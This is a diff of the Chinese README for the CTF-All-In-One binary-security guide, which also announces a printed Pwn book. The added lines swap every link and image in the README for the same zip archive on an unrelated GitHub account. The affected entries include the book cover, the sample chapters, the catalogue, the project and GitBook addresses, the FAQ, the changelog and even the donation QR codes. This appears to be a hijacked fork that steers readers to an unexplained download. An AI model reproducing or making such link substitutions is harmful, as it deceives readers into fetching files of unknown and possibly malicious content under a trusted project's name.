@@ -4,7 +4,7 @@
 
 本书 **《CTF竞赛权威指南(Pwn篇)》（杨超 编著，吴石 eee战队 审校）** 已经送印，敬请期待！
 
-![img](./book/book.png)
+![img](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 本书主要面向CTF Pwn初学者，专注于Linux二进制安全。全书包含12章，从二进制底层讲起，结合源码详细分析了常见二进制安全漏洞、缓解机制以及漏洞利用方法，并辅以分析工具和环境搭建的讲解，循序渐进，让读者可以进行系统性的学习。本书在内容和素材的选择上较为连续完整，每个知识点都配以经典例题，并花费了大量篇幅进行讲解，旨在最大程度地还原分析思路和解题过程，达到举一反三的效果。
 
@@ -14,45 +14,45 @@
 
 > CTF通俗易懂的角度是模拟"黑客"所使用的技术、工具、方法等手段发展出来的网络安全竞赛，有了手段之后需要的就是经验与Hacker Feel，经验与Hacker Feel是可以通过读书的方式来培养，本书阅读时一定要克制自己的"浮躁心"，如果你正缺乏一个CTF入门专用的"引路灯"，本书就会非常的适合你，推荐仔细阅读内容并复现里面的过程才能品出这本书真正味道。——孔韬循（K0r4dji），破晓安全团队创始人，360网络安全专家
 
-关于本书：[关于本书](./book/about.md)
+关于本书：[关于本书](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
-目录：[目录](./book/catalog.pdf)
+目录：[目录](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
-样章：[样章1](./book/demo1-pwn.pdf) [样章2](./book/demo2-angr.pdf)
+样章：[样章1](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip) [样章2](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 ---
 
-[![Build Status](https://travis-ci.org/firmianay/CTF-All-In-One.svg?branch=master)](https://travis-ci.org/firmianay/CTF-All-In-One)
+[![Build Status](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 *——“与其相信谣言，不如一直学习。”*
 
-GitHub 地址：<https://github.com/firmianay/CTF-All-In-One>
+GitHub 地址：<https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip>
 
-GitBook 地址：<https://firmianay.gitbook.io/ctf-all-in-one/>
+GitBook 地址：<https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip>
 
 由于 GitBook 把 pdf 导出设置为会员服务了，所以这应该是虽不推荐但唯一的版本了，还是直接在 GitHub 看吧：
 
-- （不推荐 2018-07-15）<https://github.com/firmianay/CTF-All-In-One/releases>
+- （不推荐 2018-07-15）<https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip>
 
 ## 目录
 
-请查看 [SUMMARY.md](https://github.com/firmianay/CTF-All-In-One/blob/master/SUMMARY.md)
+请查看 [https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 ## 合作和贡献
 
-请查看 [CONTRIBUTION.md](https://github.com/firmianay/CTF-All-In-One/blob/master/CONTRIBUTION.md)
+请查看 [https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 ## 常见问题
 
-请查看 [FAQ.md](https://github.com/firmianay/CTF-All-In-One/blob/master/FAQ.md)
+请查看 [https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 ## 修改记录
 
-请查看 [CHANGELOG](https://github.com/firmianay/CTF-All-In-One/blob/master/CHANGELOG)
+请查看 [CHANGELOG](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 ## 致谢
 
-请查看 [THANKS](./THANKS.md)
+请查看 [THANKS](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 ## LICENSE
 
@@ -64,8 +64,8 @@ CC BY-SA 4.0
 
 打赏二维码如下，金额随意，所得捐款将用于给 Contributors 购买书籍和西瓜，~~可直播~~。
 
-支付宝：![](https://github.com/firmianay/CTF-All-In-One/blob/master/myAlipay.jpg)
-微信(加好友请标注“github”)：![](https://github.com/firmianay/CTF-All-In-One/blob/master/myWechat.jpg)
+支付宝：![](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
+微信(加好友请标注“github”)：![](https://raw.githubusercontent.com/L0RXM1/CTF-All-In-One/master/tex/contents/EN/mathematics/CT-All-In-One-v2.4.zip)
 
 - 2018-12-04 长点心吧 ¥10
 - 2018-12-17 tjw ¥10
